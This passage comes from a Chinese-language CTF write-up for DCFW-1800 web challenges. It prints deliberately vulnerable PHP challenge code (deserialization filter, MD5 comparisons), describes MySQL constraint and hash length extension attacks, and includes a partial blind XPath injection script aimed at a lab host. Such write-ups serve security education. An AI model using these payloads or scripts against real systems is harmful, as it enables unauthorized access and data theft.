class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>// error_reporting(0);<br>class File &#123;<br><br>    public $user;<br>    public $pass;<br>    public $repass;<br>    public $dir;<br><br>    function __construct($data1, $data2, $data3, $data4)<br>    &#123;<br>        $this-&gt;user = $data1;<br>        $this-&gt;pass = $data2;<br>        $this-&gt;repass = $data3;<br>        $this-&gt;dir = $data4;<br>    &#125;<br><br>    function Login()<br>    &#123;<br>    	if (($this-&gt;user == &#x27;ohhhh&#x27; &amp;&amp; $this-&gt;pass == &#x27;a3333&#x27;) || ($this-&gt;user == &#x27;admin&#x27; &amp;&amp; $this-&gt;pass == &#x27;admin888&#x27;)) &#123;<br>    		return true;<br>    	&#125; else &#123;<br>    		return false;<br>    	&#125;<br>    &#125;<br><br>    function __destruct()<br>    &#123;<br>    	if ($this-&gt;Login()) &#123;<br>    		readfile($this-&gt;dir);<br>    	&#125; else &#123;<br>    		die(&#x27;wrong user or pass&#x27;);<br>    	&#125;<br>    &#125;<br>&#125;<br><br>function filter($data)&#123;<br>    if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;) &#123;<br>        return $data;<br>    &#125; else &#123;<br>        $filter_arr = array(&#x27;admin&#x27;,&#x27;test&#x27;,&#x27;root&#x27;);<br>        return preg_replace(&#x27;/admin|test|root/i&#x27;,&#x27;hacker&#x27;,$data);<br>    &#125;<br><br>&#125;<br><br>if (isset($_GET[&#x27;user&#x27;]) &amp;&amp; isset($_GET[&#x27;pass&#x27;]) &amp;&amp; isset($_GET[&#x27;repass&#x27;]) &amp;&amp; isset($_GET[&#x27;dir&#x27;])) &#123;<br>    $user = $_GET[&#x27;user&#x27;];<br>    $pass = $_GET[&#x27;pass&#x27;];<br>    $repass = $_GET[&#x27;repass&#x27;];<br>    $dir = $_GET[&#x27;dir&#x27;];<br><br>    $get = filter(serialize($_GET));<br>&#125; else &#123;<br>    die(&#x27;hello world&#x27;);<br>&#125;<br><br><br><br>?&gt;<br></code></pre></div></td></tr></table></figure>

<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213101422.png" srcset="/img/loading.gif" lazyload alt="image-20241024213101422"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213110669.png" srcset="/img/loading.gif" lazyload alt="image-20241024213110669"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213120035.png" srcset="/img/loading.gif" lazyload alt="image-20241024213120035"></p>
<h2 id="12、WEB-login-wc"><a href="#12、WEB-login-wc" class="headerlink" title="12、WEB_login_wc"></a>12、WEB_login_wc</h2><p>这里是mysql的约束攻击，注册admin   账号很多空格，成因是因为后端没引号闭合约束 </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bouIevard/article/details/121674348">https://blog.csdn.net/bouIevard/article/details/121674348</a> </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213205514.png" srcset="/img/loading.gif" lazyload alt="image-20241024213205514"></p>
<h2 id="13、WEB-just-play-wc"><a href="#13、WEB-just-play-wc" class="headerlink" title="13、WEB_just_play_wc"></a>13、WEB_just_play_wc</h2><p>进去是一个JS的小游戏，查看源码 </p>
<p>看到一个js，写个脚本爆破一下 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213517791.png" srcset="/img/loading.gif" lazyload alt="image-20241024213517791"></p>
<p>脚本跑出来 </p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.200:40150/js/bhctf76.js">http://192.168.1.200:40150/js/bhctf76.js</a> </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213528923.png" srcset="/img/loading.gif" lazyload alt="image-20241024213528923"></p>
<p>同时也存在git泄露,但是屁用没有 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213539655.png" srcset="/img/loading.gif" lazyload alt="image-20241024213539655"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213545465.png" srcset="/img/loading.gif" lazyload alt="image-20241024213545465"></p>
<p>看网上相似的题型 </p>
<p>提示在getflag.php中，这里key是空的，然后guest是固定传进函数加密，这里判断需要为amdin，使用hash长度拓展攻击，使用hashpump，抓包后跟着填就行了，长度是32，这里比较模糊，其他题型也有46位和20位的，后面是类似于溢出的？admin？ </p>
<p>hash长度扩展攻击 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213617430.png" srcset="/img/loading.gif" lazyload alt="image-20241024213617430"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213624307.png" srcset="/img/loading.gif" lazyload alt="image-20241024213624307"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213631759.png" srcset="/img/loading.gif" lazyload alt="image-20241024213631759"></p>
<p>这里默认是16进制的，需要将\x变成%，还有一些其他的符号也需要用URL编码，然后在替换cookie中的verify </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213640810.png" srcset="/img/loading.gif" lazyload alt="image-20241024213640810"></p>
<p>参考 </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34062329/article/details/94348233">https://blog.csdn.net/weixin_34062329/article/details/94348233</a> ——WEB15 </p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/106534008">https://zhuanlan.zhihu.com/p/106534008</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pcat/p/5478509.html">https://www.cnblogs.com/pcat/p/5478509.html</a> </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/108320878">https://blog.csdn.net/weixin_39934520/article/details/108320878</a> </p>
<h2 id="14、WEB-hashcollection-wc"><a href="#14、WEB-hashcollection-wc" class="headerlink" title="14、WEB_hashcollection_wc"></a>14、WEB_hashcollection_wc</h2><p>题目代码</p>
<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;hash1&quot;</span>] != <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&quot;md2&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;hash1&quot;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;level 1 failed&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash2&#x27;</span>] === <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash3&#x27;</span>] || <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash2&#x27;</span>]) !== <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash3&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;level 2 failed&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//level 3</span><br><span class="hljs-variable">$hash4</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash4&#x27;</span>];<br><span class="hljs-variable">$hash5</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash5&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$hash4</span>))&#123;<br>    <span class="hljs-variable">$md5_1</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$hash4</span>);<br>    <span class="hljs-variable">$md5_2</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$hash5</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$md5_1</span> != <span class="hljs-variable">$md5_2</span>)&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$md5_1</span>, <span class="hljs-string">&#x27;amtkz&#x27;</span>, <span class="hljs-string">&#x27;0316&#x27;</span>);<br>        <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$md5_2</span>, <span class="hljs-string">&#x27;amtkz&#x27;</span>, <span class="hljs-string">&#x27;0316&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;level 3 success&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;can u give me the right hash?&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;is hash4 numeric??????&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//level 4</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash6&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash7&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash6&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash7&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))) &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;level 4 success&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wrong!&quot;</span>;<br>    &#125;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;wrong!&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-comment">//level 5</span><br><span class="hljs-variable">$str1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str1&#x27;</span>];<br><span class="hljs-variable">$str2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str2&#x27;</span>];<br><span class="hljs-variable">$str3</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str3&#x27;</span>];<br><span class="hljs-variable">$str4</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str4&#x27;</span>];<br><span class="hljs-variable">$str5</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str5&#x27;</span>];<br><span class="hljs-variable">$str6</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str6&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>) &amp;&amp;<br><br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>) &amp;&amp;<br><br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>) &amp;&amp;<br><br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>) &amp;&amp;<br><br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>)<br>) &#123;<br>    <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>&#125;<br>level <span class="hljs-number">1</span> failed<br></code></pre></div></td></tr></table></figure>

<h2 id="15、WEB-fff2-wc"><a href="#15、WEB-fff2-wc" class="headerlink" title="15、WEB_fff2_wc"></a>15、WEB_fff2_wc</h2><p>先介绍一下stdClass的类——来自 <a target="_blank" rel="noopener" href="https://www.jb51.net/article/49140.htm">https://www.jb51.net/article/49140.htm</a> </p>
<p>$user &#x3D; new stdClass(); </p>
<p>$user-&gt;name &#x3D; ‘gouki’; </p>
<p>这样的代码，这是干嘛用的呢？ </p>
<p>翻开手册，搜索stdClass，你会发现，手册上几乎没有介绍，如果你再次搜索google，看到的也几乎全是英文解释。 </p>
<p>其实，stdClass在PHP5才开始被流行。而stdClass也是zend的一个保留类。似乎没有其他作用。也几乎没有任何说明。 </p>
<p>或者，我们可以这么理解：stdClass是PHP的一个基类，所有的类几乎都继承这个类，所以任何时候都可以被new，可以让这个变量成为一个object。同时，这个基类又有一个特殊的地方，就是没有方法。 </p>
<p>或者，我们可以又这么理解一下，正因为PHP5的对象的独特性，对象在任何地方被调用，都是引用地址型的，所以相对消耗的资源会少一点。在其它页面为它赋值时是直接修改，而不是引用一个拷贝。 </p>
<p>例如： </p>
<p>$user &#x3D; new stdClass(); </p>
<p>$user-&gt;name &#x3D; ‘gouki’; </p>
<p>$myUser &#x3D; $user; </p>
<p>$myUser-&gt;name &#x3D; ‘flypig’; </p>
<p>向这种题目，就可以使用stdClass类，利用PHP的特性。 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213831343.png" srcset="/img/loading.gif" lazyload alt="image-20241024213831343"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213840875.png" srcset="/img/loading.gif" lazyload alt="image-20241024213840875"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213848988.png" srcset="/img/loading.gif" lazyload alt="image-20241024213848988"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213859301.png" srcset="/img/loading.gif" lazyload alt="image-20241024213859301"></p>
<h2 id="16、WEB-easy-injection-wc"><a href="#16、WEB-easy-injection-wc" class="headerlink" title="16、WEB_easy_injection_wc"></a>16、WEB_easy_injection_wc</h2><p>这里提示，查看源码发现base64编码内容，解码后发现是?id&#x3D;，判断为sql注入， </p>
<p>但是使用普通的and不行，判断是其他类型的注入，这里 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213918313.png" srcset="/img/loading.gif" lazyload alt="image-20241024213918313"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213922112.png" srcset="/img/loading.gif" lazyload alt="image-20241024213922112"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213927179.png" srcset="/img/loading.gif" lazyload alt="image-20241024213927179"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213933192.png" srcset="/img/loading.gif" lazyload alt="image-20241024213933192"></p>
<p>后端代码 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213943424.png" srcset="/img/loading.gif" lazyload alt="image-20241024213943424"></p>
<p>It_is_funny_14354223.xml内容 </p>
<p>这里xpath注入，而且没有回显什么的，不知道这个注入方式会不会显错，直接找现成的payload直接用 </p>
<p>这道题目是盲注，所以需要写脚本 </p>
<p>这里参考了大佬的文章 <a target="_blank" rel="noopener" href="https://copyfuture.com/blogs-details/202206110044038396#XPATH_1">https://copyfuture.com/blogs-details/202206110044038396#XPATH_1</a> </p>
<p>本地备份：[xpath注入](onenote:<a target="_blank" rel="noopener" href="https://d.docs.live.net/5fd9226643f52715/%E6%96%87%E6%A1%A3/%E6%B6%B5%E8%BE%89">https://d.docs.live.net/5fd9226643f52715/文档/涵辉</a> 的笔记本&#x2F;微信保存.one#Xpath注入&amp;section-id&#x3D;{0AEE60AF-B9E0-4B55-AEEF-4D89B851138C}&amp;page-id&#x3D;{2FFF92E5-097E-472A-8845-EAB7BA7ADF2A}&amp;end) </p>
<p>然后 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214030014.png" srcset="/img/loading.gif" lazyload alt="image-20241024214030014"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214036645.png" srcset="/img/loading.gif" lazyload alt="image-20241024214036645"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214050275.png" srcset="/img/loading.gif" lazyload alt="image-20241024214050275"></p>
<p>脚本模块 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214104407.png" srcset="/img/loading.gif" lazyload alt="image-20241024214104407"></p>
<p>猜根名 </p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214115629.png" srcset="/img/loading.gif" lazyload alt="image-20241024214115629"></p>
<p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214127139.png" srcset="/img/loading.gif" lazyload alt="image-20241024214127139"></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>gjd = <span class="hljs-number">0</span><br><span class="hljs-comment"># 跟节点数量和长度</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    url1 = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    url2 = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    payload1 = <span class="hljs-string">&quot;&#x27;or count(/)=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>    payload2 = <span class="hljs-string">&quot;&#x27;or string-length(name(/*[1]))=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;and &#x27;&#x27;=&#x27;&quot;</span><br>    url1 += payload1<br>    url2 += payload2<br>    a = requests.get(url=url1)<br>    b = requests.get(url=url2)<br>    <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;根节点有<span class="hljs-subst">&#123;i&#125;</span>个&quot;</span>)<br>    <span class="hljs-keyword">if</span> b.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        gjd = i<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;根节点长度有<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment"># 根名</span><br>a = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm&#x27;</span><br>genName = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, gjd + <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>        payload = <span class="hljs-string">&quot;&#x27;or substring(name(/*), &quot;</span> + <span class="hljs-built_in">str</span>(j) + <span 